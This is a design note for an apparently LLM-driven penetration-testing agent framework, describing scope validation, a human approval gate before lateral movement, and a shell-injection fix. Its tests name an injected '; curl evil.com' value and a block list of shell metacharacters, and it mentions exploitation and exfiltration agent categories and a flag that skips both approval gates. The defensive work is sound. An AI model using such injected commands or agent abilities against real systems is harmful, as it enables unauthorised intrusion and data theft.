# Phase -1 Architecture — Chimeras v2 Prerequisites (IMPLEMENTED)

**Author**: Alpha
**Date**: 2026-07-21
**Status**: ✅ Complete — commit `cb6c0ba`, 14/14 tests passed

---

## 1. Objective

Closed four security and reliability gaps in Chimeras v1 before any v2 autonomy work began:

1. ✅ **Hard target/CIDR validation** — code-level enforcement that tool commands only target hosts within `state["mission"]["scope"]`
2. ✅ **Lateral approval gate** — second human-in-loop gate before any lateral/internal pivot
3. ✅ **Shell-metacharacter injection fix** — closed the `shell=True` command-injection bypass in `ToolExecutor.run()`
4. ✅ **WarChief fallback** — defined safe degradation when WarChief LLM output is malformed or the call fails

---

## 2. What Was Implemented

### 2.1 Target/CIDR Validation (`core/scope.py` — `TargetValidator`)

- `extract_targets(command)` — regex extraction of IPs and hostnames from command strings
- `resolve_target(target)` — DNS resolution, returns list of IPs
- `is_in_scope(target, scope)` — CIDR matching, single IP, domain wildcard, comma-separated lists
- `validate(command, scope)` — full validation pipeline: extract → resolve → check scope

**Scope formats supported**: CIDR (`10.10.10.0/24`), single IP, domain (`example.com`, `*.example.com`), comma-separated, `any`/`*` (dev only, logged with warning).

**Edge cases handled**: no identifiable target → pass through, hostname → multiple IPs all must be in scope, DNS failure → block, private IPs → exact match required.

### 2.2 Lateral Approval Gate (`graph.py` + `core/state.py`)

- `lateral_approval_node` — same pattern as `human_approval_node`
- Presents internal targets discovered, asks operator y/n
- `--approve` flag bypasses both gates
- Denied → route to Bookkeeper (not retry loop)
- Approved → route to ARIA for lateral recon
- Gate trigger: WarChief decision value `pivot_lateral_recon` or any `lateral_*` value

### 2.3 Shell-Metacharacter Injection Fix (`core/scope.py` + `core/tool_executor.py`)

- `SHELL_METACHARS` = `{';', '&&', '||', '|', '`', '$(', '\n'}`
- `ScopeEnforcer.check_shell_safety(command, bot_name)` — detects metacharacters
- Categories that require shell (`exploitation`, `privesc`, `exfiltration`): allowed, logged with warning
- All other categories: rejected before execution
- `BaseBot._run_tool()` calls `check_shell_safety()` before `executor.run()`

### 2.4 WarChief Fallback (`warchief/agent.py`)

- `run()` override with try/except wrapping `super().run()`
- On failure: fallback decision with `decision: "report"`, writes fallback plan to `plan.md`
- `warchief_fallback` flag set in state → graph routing function routes directly to Bookkeeper
- Valid decision set enforced: if `decision` field missing or invalid → fallback to `report`

---

## 3. New State Fields

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `lateral_approval` | `bool` | `False` | Lateral movement gate flag |
| `target_context` | `str` | `"external"` | Current target context: external or lateral |
| `external_targets` | `List[str]` | `[]` | External-facing hosts from initial scope |
| `internal_targets` | `List[str]` | `[]` | Internally-discovered hosts |
| `exploited_hosts` | `List[str]` | `[]` | Hosts with confirmed access |
| `warchief_decision` | `str` | `""` | WarChief's last routing decision |
| `warchief_fallback` | `bool` | `False` | Whether WarChief is in fallback mode |

Plus 5 more v2 fields added in later phases: `discovered_targets`, `scope_exhausted`, `mission_state`, `decision_history`, `failed_vectors`, `target_artifacts`, `aggressiveness`, `loop_counts`.

---

## 4. Security Threat Model

| Threat | Mitigation | Status |
|--------|------------|--------|
| Command injection via shell metacharacters | `check_shell_safety()` rejects in restricted categories | ✅ Implemented |
| Out-of-scope target exploitation | `TargetValidator.validate()` blocks out-of-scope targets | ✅ Implemented |
| Lateral movement without authorization | `lateral_approval` gate requires human sign-off | ✅ Implemented |
| WarChief SPOF causing engagement crash | Fallback defaults to safe `report` route | ✅ Implemented |
| DNS rebinding to bypass scope | `TargetValidator` resolves hostnames at validation time | ✅ Implemented |
| LLM prompt injection to bypass scope | Code-level checks — LLM cannot override | ✅ Implemented |

---

## 5. Testing Results

14/14 tests passed:
- `test_target_validator.py`: CIDR matching, IP extraction, hostname resolution, out-of-scope rejection, edge cases
- `test_shell_safety.py`: Metacharacter detection, category-based allow/deny, edge cases
- `test_warchief_fallback.py`: Malformed JSON, missing decision field, invalid decision value, LLM call failure
- `test_lateral_gate.py`: Gate state transitions, approve/deny paths

Security tests:
- Scope bypass via `; curl evil.com` in nmap command → blocked ✅
- Scope bypass via `&&` chaining → blocked ✅
- Scope bypass via backtick substitution → blocked ✅
- Scope bypass via `$()` command substitution → blocked ✅
- Out-of-scope IP in exploitation command → blocked ✅
- WarChief fallback doesn't crash the graph → verified ✅
- Lateral gate blocks without approval → verified ✅

---

**Phase -1 Status**: COMPLETE — gates all v2 work. No known gaps.